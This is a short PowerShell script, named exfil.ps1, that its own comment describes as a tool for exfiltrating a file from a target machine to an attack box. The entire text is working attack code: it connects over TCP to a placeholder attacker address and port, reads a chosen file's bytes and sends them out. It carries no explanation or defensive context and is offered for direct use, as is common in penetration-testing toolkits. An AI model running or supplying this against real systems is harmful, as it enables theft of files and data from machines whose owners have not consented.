# exfil.ps1
#
# For exfiltrating a file from a target machine to an attack box in PowerShell.
#

$targetIP   = '10.10.10.10'
$targetPort = 8000
$file       = '\path\to\file.txt'

$tcpClient = new-object system.net.sockets.tcpclient($targetIP, $targetPort)
$clientStream = $tcpClient.GetStream()
$clientStream.Flush()

$msgBytes = [System.IO.File]::ReadAllBytes($file)
$clientStream.Write($msgBytes, 0, $msgBytes.length)

$tcpClient.Dispose()
$clientStream.Dispose()
